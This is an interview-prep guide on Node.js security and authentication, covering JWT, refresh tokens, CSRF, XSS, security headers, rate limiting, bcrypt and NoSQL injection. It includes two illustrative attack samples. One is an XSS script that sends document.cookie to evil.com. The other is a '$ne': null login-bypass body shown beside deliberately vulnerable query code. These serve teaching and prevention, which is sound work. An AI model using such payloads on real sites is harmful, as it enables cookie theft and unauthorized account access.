# Security & Auth – Interview Questions & Answers

Questions that were really asked in interviews (company rounds, online interview reports, YouTube
interviews).
Ordered by priority: the question asked by the most interviewers comes first.

---

##### 1. What is JWT and how is it used for authentication and authorization?

*(Asked 3×: Persistent Systems, American Express, TCS (online))*

==> **JWT (JSON Web Token)** is a small **signed** token that carries user info like id and role.
The server hands it out at login and checks it on every request.

- **Authentication (who are you):** user logs in → server checks the password → server creates a
  JWT signed with a secret → sends it to the client.
- The client sends it back on every request: `Authorization: Bearer <token>`.
- The server **verifies the signature**. Valid → it trusts the user id inside.
- **Authorization (what can you do):** the server reads `role` from the token and allows or blocks
  the action.
- **Stateless:** no session stored on the server.

```js
const jwt = require('jsonwebtoken');

// login
const token = jwt.sign({ id: 7, role: 'admin' }, process.env.JWT_SECRET, { expiresIn: '15m' });

// every request
const payload = jwt.verify(token, process.env.JWT_SECRET); // throws if fake or expired
console.log(payload);
// Output: { id: 7, role: 'admin', iat: 1732430000, exp: 1732430900 }
```

In short: JWT = a signed ID card. Signed, **not encrypted**, so never put passwords or secrets in
it.

---

##### 2. How can you secure a Node.js API? What best practices should be followed?

*(Asked 3×: Persistent Systems, Wipro, TechnoVerse Solutions)*

==> Think in layers:
- **HTTPS** everywhere.
- **Authentication** (JWT/OAuth) + **authorization** (role checks) on every protected route.
- **Validate input** (Joi / Zod / express-validator) and use **parameterized queries** → stops
  SQL/NoSQL injection.
- **Helmet** → security headers.
- **Rate limiting** (`express-rate-limit`) → stops brute force.
- **CORS** only for trusted origins.
- **bcrypt** for passwords; secrets in env variables / a secrets manager, never in code.
- **Body size limit** so huge payloads can't crash the server.
- Hide stack traces from clients; log them on the server.
- `npm audit` and keep packages updated.

```js
const express = require('express');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const cors = require('cors');

const app = express();
app.use(helmet());
app.use(cors({ origin: 'https://myapp.com' }));
app.use(rateLimit({ windowMs: 15 * 60 * 1000, limit: 100 }));
app.use(express.json({ limit: '10kb' }));
```

In short: HTTPS + auth + validation + headers + rate limit + safe secrets.

---

##### 3. Which library did you use for authentication (jsonwebtoken)? Other than JWT, which module (Passport)?

*(Asked 2×: Web3Dev, EarlyCoder 5-yr Node (YT))*

==> Sample answer: "I used **jsonwebtoken** to sign and verify tokens and **bcrypt** to hash
passwords. I have also used **Passport.js** for social login."

**Passport** is auth middleware for Express. Each login method is a **strategy**:
- `passport-local` → email + password
- `passport-jwt` → protect routes with a JWT
- `passport-google-oauth20`, GitHub, Facebook → social login via **OAuth 2.0**

```js
passport.use(new GoogleStrategy(
  { clientID, clientSecret, callbackURL: '/auth/google/callback' },
  async (accessToken, refreshToken, profile, done) => {
    const user = await User.findOrCreate({ googleId: profile.id });
    done(null, user);
  }
));
```

In short: jsonwebtoken for tokens, bcrypt for passwords, Passport for plug-in login strategies.

---

##### 4. What is the difference between authentication and authorization?

*(Asked 2×: Capsitech, Dehaat)*

==>
```text
+--------------+---------------------------------+----------------------------------+
|              | Authentication                  | Authorization                    |
+==============+=================================+==================================+
| Question     | Who are you?                    | What are you allowed to do?      |
+--------------+---------------------------------+----------------------------------+
| When         | First                           | After authentication             |
+--------------+---------------------------------+----------------------------------+
| How          | Password, OTP, JWT, OAuth login | Roles, permissions (admin, user) |
+--------------+---------------------------------+----------------------------------+
| Failure code | 401 Unauthorized                | 403 Forbidden                    |
+--------------+---------------------------------+----------------------------------+
| Example      | Logging in to Gmail             | Only admin can delete users      |
+--------------+---------------------------------+----------------------------------+
```

```js
app.delete('/users/:id', auth, allowRoles('admin'), deleteUser);
// no / bad token     → 401 (auth failed)
// valid token, role 'user' → 403 (not allowed)
```

In short: **authentication = identity (401)**, **authorization = permission (403)**.

---

##### 5. How do you implement rate limiting in Express?

*(Asked 2×: Wipro, TechnoVerse Solutions)*

==> **Rate limiting** = allow only N requests per IP/user in a time window. Extra requests get
**429 Too Many Requests**. Stops brute force and abuse.

```js
const rateLimit = require('express-rate-limit');

app.use('/api', rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  limit: 100,               // 100 requests per IP per window (older versions: max)
  standardHeaders: true,    // sends RateLimit-* headers
}));

// stricter for login
app.use('/api/login', rateLimit({ windowMs: 15 * 60 * 1000, limit: 5 }));
// 6th login try in 15 min → 429 Too Many Requests
```

- Many servers? Use a shared **Redis store** (`rate-limit-redis`) so all servers share one count.
- Behind a proxy/load balancer, set `app.set('trust proxy', 1)` so the real client IP is used.

In short: `express-rate-limit` + Redis store → 429 after the limit.

---

##### 6. What is the structure of a JWT?

*(Asked 1×: Senior Node.js round (YT))*

==> Three parts joined by dots: **`header.payload.signature`**

```text
eyJhbGciOiJIUzI1NiJ9 . eyJpZCI6MTIzLCJleHAiOjE3MzI0MzA5MDB9 . 4pcPyMD09olPSyXnrXCjTw...
      header                       payload                       signature
```

- **Header** → algorithm + type: `{ "alg": "HS256", "typ": "JWT" }`
- **Payload** → **claims**: `{ "id": 123, "role": "user", "iat": ..., "exp": ... }`
- **Signature** → `HMACSHA256(base64url(header) + "." + base64url(payload), secret)`
- Header and payload are only **Base64URL-encoded**, not encrypted → anyone can read them.

In short: header (how it's signed) + payload (data) + signature (proof nobody changed it).

---

##### 7. How do you verify a JWT? Is it decrypted?

*(Asked 1×: Senior Node.js round (YT))*

==> **No, it is not decrypted.** A normal JWT is **signed, not encrypted**.
- The server re-computes the signature from header + payload with the secret (**HS256**), or
  checks it with the public key (**RS256**), and compares it with the token's signature.
- It also checks **`exp`** (expiry).
- `jwt.verify()` does all of this; mismatch or expired → throws → return 401.
- Pin the algorithm (`algorithms: ['HS256']`) so an attacker can't switch it.

```js
try {
  const user = jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256'] });
} catch (err) {
  console.log(err.name);
  // Output: TokenExpiredError  (or JsonWebTokenError for a bad signature)
}
```

In short: verify = re-check the signature + expiry, nothing gets decrypted.

---

##### 8. What is the difference between jwt.decode and jwt.verify?

*(Asked 1×: Senior Node.js round (YT))*

==>
```text
+----------------+-----------------------------------------+---------------------------------+
|                | jwt.decode                              | jwt.verify                      |
+================+=========================================+=================================+
| What it does   | Just Base64-decodes the payload         | Checks signature + expiry, then |
|                |                                         | returns the payload             |
+----------------+-----------------------------------------+---------------------------------+
| Needs secret?  | No                                      | Yes (secret or public key)      |
+----------------+-----------------------------------------+---------------------------------+
| Safe for auth? | No - a fake token decodes fine too      | Yes                             |
+----------------+-----------------------------------------+---------------------------------+
| Use for        | Debugging, reading exp on the frontend  | Protecting routes               |
+----------------+-----------------------------------------+---------------------------------+
```

```js
jwt.decode(fakeToken);           // { id: 1, role: 'admin' }  ← happily returns it
jwt.verify(fakeToken, secret);   // throws JsonWebTokenError: invalid signature
```

In short: never trust `decode` for security; always `verify`.

---

##### 9. An attacker changes the user id inside a copied JWT from 123 to 456. How does JWT stop this?

*(Asked 1×: Senior Node.js round (YT))*

==> The **signature** stops it.
1. The signature was created from the original payload (id 123) using the server's **secret**.
2. The attacker changes the payload to 456 but doesn't know the secret, so they can't create a
   matching signature.
3. `jwt.verify` re-computes the signature for the new payload → doesn't match → **401**.

Catch: if the attacker steals the **unchanged** token, it still works until it expires. That's why
access tokens are **short-lived** and only sent over **HTTPS**.

In short: changing the payload breaks the signature; stealing the token is the real risk.

---

##### 10. How do you protect your APIs from unauthorized access?

*(Asked 1×: Senior Node.js round (YT))*

==> Check **who** the caller is and **what** they may do, on the server, on every request. In
Express this is middleware:
1. User logs in → gets a short-lived **access token** (JWT).
2. Client sends it in `Authorization: Bearer <token>` (or an HttpOnly cookie).
3. **Auth middleware** runs `jwt.verify` → missing/invalid → **401**.
4. **Role middleware** checks permission → not allowed → **403**.
5. Also check **ownership** (user 5 can't read `/orders` of user 6).
6. Plus HTTPS, rate limiting, CORS whitelist, input validation.

```js
const allowRoles = (...roles) => (req, res, next) =>
  roles.includes(req.user.role) ? next() : res.status(403).json({ message: 'Forbidden' });

app.delete('/users/:id', auth, allowRoles('admin'), deleteUser);
```

In short: auth middleware (401) → role/ownership check (403) → route.

---

##### 11. Create a middleware to verify a JWT token

*(Asked 1×: Wipro)*

==> Read the token from the header → verify → put the user on `req` → `next()`.

```js
const jwt = require('jsonwebtoken');

function auth(req, res, next) {
  const header = req.headers.authorization; // "Bearer <token>"
  if (!header?.startsWith('Bearer ')) {
    return res.status(401).json({ message: 'No token provided' });
  }

  try {
    req.user = jwt.verify(header.split(' ')[1], process.env.JWT_SECRET);
    next();
  } catch (err) {
    return res.status(401).json({ message: 'Invalid or expired token' });
  }
}

app.get('/profile', auth, (req, res) => res.json(req.user));
// GET /profile (no header)    → 401 { message: 'No token provided' }
// GET /profile (valid token)  → 200 { id: 7, role: 'admin', iat: ..., exp: ... }
```

In short: no token or bad token → 401; good token → `req.user` + `next()`.

---

##### 12. Tokens expire every 20 minutes and users get logged out. How do you keep them logged in?

*(Asked 1×: Senior Node Ep.32 (YT))*

==> Use an **access token + refresh token** pair.
1. On login, return a short **access token** (15–20 min) and a long **refresh token** (e.g. 7
   days, in an HttpOnly cookie).
2. Normal API calls use the access token.
3. When it expires, the frontend silently calls **`POST /auth/refresh`** and gets a new access
   token.
4. The user is only logged out when the refresh token expires or is revoked.
5. Store refresh tokens (hashed) in DB/Redis so you can **revoke** them on logout.
6. **Rotate** them: every refresh gives a new refresh token. If an old one is reused, someone
   stole it → revoke the whole family.

In short: short access token for calls, long revocable refresh token to get new ones silently.

---

##### 13. How will the front end know the token expired? Will you make a separate refresh-token API?

*(Asked 1×: Senior Node Ep.32 (YT))*

==> Yes, a separate API like **`POST /auth/refresh`**.
- An expired access token → the API returns **401**.
- An **Axios interceptor** catches the 401, calls `/auth/refresh`, then **retries the original
  request**.
- Refresh also fails → log the user out.

```js
axios.interceptors.response.use(null, async (error) => {
  if (error.response?.status === 401 && !error.config._retry) {
    error.config._retry = true;   // avoid an endless loop
    await axios.post('/auth/refresh', {}, { withCredentials: true });
    return axios(error.config);   // retry the original request
  }
  return Promise.reject(error);
});
```

In short: 401 → interceptor → refresh → retry once.

---

##### 14. When should the front end call the refresh API (polling every 5 minutes is wasteful)?

*(Asked 1×: Senior Node Ep.32 (YT))*

==> Don't poll. Two good ways:
- **On demand:** refresh only when an API returns 401 (interceptor, see Q13).
- **Just before expiry:** read `exp` from the token (`jwt-decode` on the frontend is fine for
  this) and set **one timer** ~1 minute before it expires.
- If many requests get 401 at the same time, trigger **only one** refresh call and make the others
  wait for it.

```js
const { exp } = jwtDecode(accessToken);            // seconds
const ms = exp * 1000 - Date.now() - 60_000;       // 1 min before expiry
setTimeout(refreshToken, ms);
```

In short: refresh on 401 or just before `exp`, never on a fixed poll.

---

##### 15. Where should the front end store tokens (access vs refresh)? Why?

*(Asked 1×: Senior Node Ep.32 (YT))*

==>
- **Refresh token → HttpOnly + Secure + SameSite cookie.** JavaScript can't read it, so **XSS**
  can't steal it.
- **Access token → in memory** (a JS variable / React state). Lost on reload, but you just call
  `/auth/refresh` again.
- Avoid **localStorage** for tokens: any injected script can read it.

```text
+-----------------+-----------------------+-------------------------------+
| Storage         | XSS can read?         | Sent automatically?           |
+=================+=======================+===============================+
| localStorage    | Yes                   | No                            |
+-----------------+-----------------------+-------------------------------+
| Memory          | Hard (gone on reload) | No                            |
+-----------------+-----------------------+-------------------------------+
| HttpOnly cookie | No                    | Yes (so protect against CSRF) |
+-----------------+-----------------------+-------------------------------+
```

In short: refresh token in an HttpOnly cookie, access token in memory, nothing in localStorage.

---

##### 16. If the token is in a cookie, it is sent with every request, even from another domain. How do you handle that?

*(Asked 1×: Senior Node Ep.32 (YT))*

==> That's the **CSRF** risk. Fix it with:
- **`SameSite=Strict` or `Lax`** → the browser doesn't send the cookie on cross-site requests
  (`Lax` still sends it on top-level GET links). Modern browsers default to `Lax`.
- **`HttpOnly`** (JS can't read it) + **`Secure`** (HTTPS only).
- A **CSRF token** for POST/PUT/DELETE as an extra layer.
- Never change data with GET.

```js
res.cookie('refreshToken', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
});
```

Note: **CORS does not stop the cookie from being sent**; it only stops the other site reading the
response.

In short: SameSite + HttpOnly + Secure, and a CSRF token for writes.

---

##### 17. Why is the access token's expiry shorter than the refresh token's?

*(Asked 1×: Senior Node Ep.32 (YT))*

==>
- The access token goes out on **every** request → more exposure → more chance of theft.
- A JWT can't easily be cancelled before it expires. Short life (15 min) = a stolen one is
  useless soon.
- The refresh token goes **only** to `/auth/refresh`, lives in an HttpOnly cookie and is checked
  against the DB, so it **can be revoked**. That's why it can live longer.

In short: short access token = small damage if stolen; long refresh token = user stays logged in.

---

##### 18. How would a token get stolen?

*(Asked 1×: Senior Node Ep.32 (YT))*

==>
- **XSS:** injected script reads it from localStorage or a non-HttpOnly cookie.
- **No HTTPS:** someone on public Wi-Fi sniffs it (**man-in-the-middle**).
- **Logs / URLs:** token printed in logs or sent in a query string (`?token=...`).
- **Malicious browser extensions / malware** on the user's device.
- **Shared by mistake:** pasted into chats, tickets, screenshots.

Prevention: HTTPS, HttpOnly cookies, short expiry, no tokens in URLs or logs, sanitize output.

In short: XSS, sniffing, logs, malware, careless sharing.

---

##### 19. Logging out in one browser tab: how do you log the user out of all other tabs (React)?

*(Asked 1×: American Express)*

==> Tell the other tabs that logout happened.
- **BroadcastChannel API:** post a `'logout'` message; every tab listens and clears the user.
- Or the **`storage` event:** write a key to localStorage; other tabs (not the current one) get a
  `storage` event.
- On the server, **revoke the refresh token** / clear the cookie so the session really ends.

```js
const channel = new BroadcastChannel('auth');

function logout() {
  clearUser();
  channel.postMessage('logout');   // other tabs receive this
}

useEffect(() => {
  channel.onmessage = (e) => { if (e.data === 'logout') clearUser(); };
  return () => { channel.onmessage = null; };
}, []);
```

In short: BroadcastChannel (or storage event) to sync tabs + revoke on the server.

---

##### 20. How will you make a new application secure from scratch?

*(Asked 1×: EarlyCoder 5-yr Node (YT))*

==>
1. **Design:** roles/permissions, **least privilege**, HTTPS only.
2. **Auth:** bcrypt passwords, short JWT access token + refresh token in an HttpOnly cookie.
3. **Input:** validate every request (Joi/Zod), parameterized queries / ORM.
4. **Middleware:** Helmet, CORS whitelist, rate limiting, body size limit.
5. **Secrets:** env variables / AWS Secrets Manager, never in Git.
6. **Errors & logs:** generic messages to users, detailed logs inside, alerts.
7. **Dependencies:** `npm audit`, Dependabot, regular updates.
8. **Review & test:** code review against the **OWASP Top 10**, security tests.

In short: secure by design, then layer auth, validation, headers, secrets, monitoring.

---

##### 21. What is your approach to make a secure back end?

*(Asked 1×: EarlyCoder 5-yr Node (YT))*

==> Same idea as Q20, as layers:
- **Who:** authentication (JWT/OAuth) + authorization (roles) on every route.
- **What comes in:** validate and sanitize input; parameterized queries.
- **How it travels:** HTTPS, secure cookies, CORS whitelist.
- **Abuse:** rate limiting, request size limits.
- **Headers:** Helmet.
- **Secrets & data:** secrets manager, hashed passwords, encrypted sensitive fields.
- **Watch:** logging, monitoring, `npm audit`.

In short: who → what comes in → how it travels → abuse → headers → secrets → watch.

---

##### 22. How do you ensure your code has no security flaws?

*(Asked 1×: Tech Mahindra (YT))*

==> You can't promise zero flaws, but you can catch most of them:
- **Code reviews** with an **OWASP Top 10** checklist.
- **Static analysis (SAST):** `eslint-plugin-security`, SonarQube.
- **Dependency scanning:** `npm audit`, Snyk, Dependabot.
- **Tests** for auth cases, e.g. user A can't read user B's data.
- **Secret scanning** in CI (e.g. gitleaks) so no keys reach Git.
- Regular **penetration testing** and production monitoring.

In short: review + automated scanning + auth tests + pen tests.

---

##### 23. What is an XSS attack?

*(Asked 1×: Senior Node Ep.32 (YT))*

==> **XSS (Cross-Site Scripting)** = an attacker gets their JavaScript to run on **your** site in
another user's browser.
- Example: a comment saved as
  `<script>fetch('https://evil.com?c=' + document.cookie)</script>` → everyone who views it runs
  the script.
- It can steal tokens (localStorage, non-HttpOnly cookies) or act as the user.
- Types:
  - **Stored** – saved in the DB (comments, profiles).
  - **Reflected** – comes from the URL and is echoed back.
  - **DOM-based** – frontend JS writes unsafe data into the page (`innerHTML`).

In short: XSS = attacker's script running as your user on your site.

---

##### 24. How can we prevent XSS attacks?

*(Asked 1×: Senior Node Ep.32 (YT))*

==>
- **Escape output:** React escapes `{value}` by default; avoid `dangerouslySetInnerHTML` /
  `innerHTML`.
- **Sanitize HTML** if you must render it (**DOMPurify**).
- **Validate input** on the server.
- **Content-Security-Policy** header (via Helmet) to block inline/unknown scripts.
- **HttpOnly cookies** so scripts can't read tokens even if XSS happens.

```jsx
import DOMPurify from 'dompurify';

const dirty = '<img src=x onerror="alert(1)">Hi';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(dirty) }} />
// Renders: <img src="x">Hi   (onerror removed)
```

In short: escape, sanitize, CSP, HttpOnly.

---

##### 25. How do you stop cookies being attached to requests from another domain (CSRF token, SameSite)?

*(Asked 1×: Senior Node Ep.32 (YT))*

==> Give both answers:
- **SameSite cookie** (first defence): `Strict` → never sent cross-site; `Lax` → only on
  top-level GET navigation. Add `HttpOnly` and `Secure`.
- **CSRF token** (classic): the server gives a random token; the frontend sends it in a header on
  every POST/PUT/DELETE. The attacker's site can't read it, so forged requests fail.
- Also: no data changes on GET, and check the **`Origin`** header.

Note: CORS is not the answer; it controls who can **read responses**, not whether cookies are
sent.

In short: SameSite cookie + CSRF token for writes.

---

##### 26. Have you implemented CSRF tokens?

*(Asked 1×: Senior Node Ep.32 (YT))*

==> Sample answer: "Yes. Our auth cookie was `HttpOnly; Secure; SameSite=Lax`, and for writes we
used a CSRF token with the **double-submit cookie** pattern."
1. Server creates a random token and sets it in a **readable** cookie (`XSRF-TOKEN`).
2. Frontend reads it and sends it back in the `X-XSRF-TOKEN` header (Axios can do this
   automatically).
3. Server checks header === cookie. Another site can't read our cookie, so it can't send the
   header.

```js
const crypto = require('crypto');
app.use(require('cookie-parser')());

app.get('/csrf', (req, res) => {
  const token = crypto.randomBytes(32).toString('hex');
  res.cookie('XSRF-TOKEN', token, { secure: true, sameSite: 'strict' });
  res.json({ ok: true });
});

function checkCsrf(req, res, next) {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();
  const token = req.headers['x-xsrf-token'];
  if (!token || token !== req.cookies['XSRF-TOKEN']) {
    return res.status(403).json({ message: 'Bad CSRF token' }); // forged request → 403
  }
  next();
}
app.use(checkCsrf);
```

- Stronger version: **sign** the token (HMAC tied to the session) so it can't be planted.
- `csurf` is deprecated; `csrf-csrf` is a common replacement.

In short: random token in a cookie + same value in a header; mismatch → 403.

---

##### 27. How can HTTP headers be used to improve API security?

*(Asked 1×: Persistent Systems)*

==> Security headers tell the browser to be stricter:
- **`Strict-Transport-Security` (HSTS)** → always use HTTPS.
- **`Content-Security-Policy`** → load scripts/styles only from allowed sources (stops XSS).
- **`X-Content-Type-Options: nosniff`** → don't guess file types.
- **`X-Frame-Options` / CSP `frame-ancestors`** → stop **clickjacking** (your site in an iframe).
- **`Referrer-Policy`** → don't leak full URLs.
- Remove **`X-Powered-By: Express`** → don't reveal the stack.
- **CORS** headers (`Access-Control-Allow-Origin`) → only trusted origins.

```js
app.use(helmet()); // sets most of these in one line
```

In short: headers = free browser-side protection; Helmet sets them for you.

---

##### 28. What is Helmet?

*(Asked 1×: Persistent Systems)*

==> **Helmet** is Express middleware that sets secure HTTP headers in one line (CSP, HSTS,
X-Frame-Options, nosniff, Referrer-Policy...) and removes `X-Powered-By`.

```js
const helmet = require('helmet');
app.use(helmet());

// customize one header
app.use(helmet.contentSecurityPolicy({
  directives: { defaultSrc: ["'self'"], scriptSrc: ["'self'"] },
}));
// Response now has: Content-Security-Policy: default-src 'self'; script-src 'self'
```

Interview tip: Helmet is only one layer; you still need auth, validation and rate limiting.

In short: `app.use(helmet())` = secure headers in one line.

---

## More questions from revision PDFs (not yet asked in a real interview)

Ordered by topic priority: questions from the most-asked topics come first.

---

##### 29. Sessions vs JWT: what is the difference and when do you use each?

*(Not asked in a real interview yet · From: Gaurav Sharma Node.js notes PDF, Ajeet Yadav Node.js revision PDF)*

==> Both keep a user logged in. The difference is **where the login state lives**.
- **Session:** the server stores the user data (memory, Redis, DB); the client only gets a
  **session ID** cookie. **Stateful.**
- **JWT:** the user data (claims) lives **inside a signed token**; the server just verifies the
  signature. **Stateless.**

```text
+-----------------+--------------------------------------+-------------------------------------+
| Point           | Session                              | JWT                                 |
+=================+======================================+=====================================+
| State stored    | On the server (Redis/DB)             | Inside the token (client side)      |
+-----------------+--------------------------------------+-------------------------------------+
| Logout / revoke | Easy: delete the session             | Hard: valid till it expires (use    |
|                 |                                      | short expiry + refresh / blocklist) |
+-----------------+--------------------------------------+-------------------------------------+
| Scaling         | Needs a shared store (Redis)         | Any server can verify with the key  |
+-----------------+--------------------------------------+-------------------------------------+
| Best for        | Classic server-rendered web apps     | APIs, mobile apps, microservices    |
+-----------------+--------------------------------------+-------------------------------------+
```

```js
// session (express-session)
req.session.userId = user.id;        // stored on the server, cookie holds only the ID

// JWT
const token = jwt.sign({ id: user.id }, secret, { expiresIn: '15m' }); // data in the token
```

In short: session = server remembers you (easy to revoke); JWT = token proves who you are
(stateless, good for APIs).

---

##### 30. Why use bcrypt and not SHA-256 for passwords?

*(Not asked in a real interview yet · From: Gaurav Sharma Node.js notes PDF)*

==> **SHA-256 is fast** — great for files, bad for passwords. With a stolen DB, a GPU can try
**billions of guesses per second**.
- **bcrypt is slow on purpose** with a **cost factor** (salt rounds); raise it as hardware gets
  faster.
- bcrypt adds a **random salt** automatically → same password, different hashes → **rainbow
  tables** don't work.
- Plain SHA-256 has no salt and no work factor.
- Other good choices: **argon2** (modern recommendation), **scrypt**.
- Note: bcrypt only uses the first **72 bytes** of the password.

```js
const bcrypt = require('bcrypt');

const hash = await bcrypt.hash('secret123', 12);   // 12 = cost
console.log(hash);
// Output: $2b$12$Q9z...  (different every time because of the salt)
await bcrypt.compare('secret123', hash);           // true
await bcrypt.compare('wrong', hash);               // false
```

In short: password hashing must be **slow and salted**; bcrypt is, SHA-256 is not.

---

##### 31. What is CORS?

*(Not asked in a real interview yet · From: Gaurav Sharma Node.js notes PDF, Ajeet Yadav Node.js revision PDF)*

==> **CORS (Cross-Origin Resource Sharing)** is a **browser** rule. By default the browser won't let
a page read a response from a different **origin** (protocol, domain or port).
- Example: frontend `http://localhost:3000` → API `http://localhost:5000` = cross-origin.
- The server allows it with headers like **`Access-Control-Allow-Origin`**.
- For non-simple requests (PUT/DELETE, custom headers, `Content-Type: application/json`) the
  browser first sends a **preflight `OPTIONS`** request.
- Only browsers enforce CORS. Postman, curl and server-to-server calls ignore it → **CORS is not
  authentication**.

```js
const cors = require('cors');
app.use(cors({
  origin: ['https://myapp.com'], // never '*' together with credentials
  credentials: true,
}));
// Response header: Access-Control-Allow-Origin: https://myapp.com
```

In short: CORS = the server's response headers tell the browser which other origins may read it.

---

##### 32. What is NoSQL injection and how do you prevent it?

*(Not asked in a real interview yet · From: Gaurav Sharma Node.js notes PDF)*

==> **NoSQL injection** = user input changes the meaning of a MongoDB query.
- Usual trick: send a **query operator** (`$ne`, `$gt`, `$where`) instead of a plain value.
- Login attack body: `{ "email": "a@b.com", "password": { "$ne": null } }` → "password not equal
  to null" matches every user → attacker logs in.

```js
// Vulnerable
User.findOne({ email: req.body.email, password: req.body.password });
```

How to prevent:
1. **Validate types** (Joi / Zod / express-validator): password must be a string.
2. **Strip `$` and `.` keys** from input, or turn on Mongoose's
   `mongoose.set('sanitizeFilter', true)`.
3. **Cast values:** `String(req.body.email)`.
4. Never use `$where` or build queries from raw strings.
5. Compare passwords with **bcrypt**, never inside the query.

```js
const user = await User.findOne({ email: String(req.body.email) });
const ok = user && await bcrypt.compare(String(req.body.password), user.passwordHash);
```

In short: never pass raw user objects into queries; validate types and strip `$` operators.

======================================================================================================================================

## What to study first

```
Authentication vs Authorization   (the basic idea behind everything else)
   ↓
JWT                               (structure, sign, verify vs decode)
   ↓
Access & refresh tokens           (expiry, refresh API, where to store tokens)
   ↓
XSS & CSRF                        (how tokens get stolen and how cookies get abused)
   ↓
Security headers & Helmet         (browser-side protection in one line)
   ↓
Rate limiting & API best practices (put all layers together)
```

Authentication vs authorization and JWT are the foundation. Access/refresh tokens and token storage
build on JWT.
XSS and CSRF explain why we use HttpOnly, Secure and SameSite cookies. Helmet, rate limiting and the
best-practice
checklist tie everything into one "secure back end" answer.
